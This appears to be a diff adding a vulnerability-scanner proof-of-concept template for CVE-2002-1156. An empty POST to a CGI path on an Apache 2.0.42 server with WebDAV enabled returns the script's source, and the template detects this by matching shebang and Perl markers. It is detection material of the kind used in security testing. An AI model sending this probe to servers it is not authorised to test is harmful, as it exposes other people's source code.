@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "Apache 2.0.42 中当目录同时启用 WebDAV 和 CGI 时，通过 POST 请求可获取 CGI 脚本源代码而非执行结果。发送 POST 请求到 CGI 脚本路径，检测响应是否包含脚本源码特征"
+id = "POC-AVE-2002-0043"
+name = "Apache HTTP Server 2.0.42 CGI Source Code Disclosure PoC"
+severity = "medium"
+tags = ["ave-2002-0043"]
+vuln_id = [
+    "CVE-2002-1156",
+    "AVE-2002-0043",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Length = "0"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/bin/sh",
+    "#!/usr/bin/python",
+    'print "Content-Type',
+    "print <<",
+    "sub main",
+    "use CGI",
+]
